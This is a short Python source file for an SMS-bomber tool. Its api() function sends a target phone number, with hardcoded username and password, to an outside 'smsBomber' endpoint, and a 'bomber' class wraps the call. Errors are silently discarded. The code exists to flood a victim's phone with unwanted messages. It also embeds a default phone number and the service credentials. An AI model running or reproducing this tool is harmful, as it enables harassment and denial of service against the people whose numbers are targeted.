#api requests function
import requests,json
def api(phone="01819400400",api="*"):
	url = "https://proxy-api-aru.vercel.app/api/v4/smsBomber/"+api
	headers = {"x-app-version":"1.1.0","x-autor-name":"Ariful Islam Arman(ARU)","Content-Type":"application/json"}
	data = '{"username":"aru","password":"infinity","number":"'+phone+'"}'
	try:
		req = requests.post(url,data=data,headers=headers)
		if req.json()["status"] == True:
			return req.json()
	except Exception as err:
		pass
class bomber:
	api = api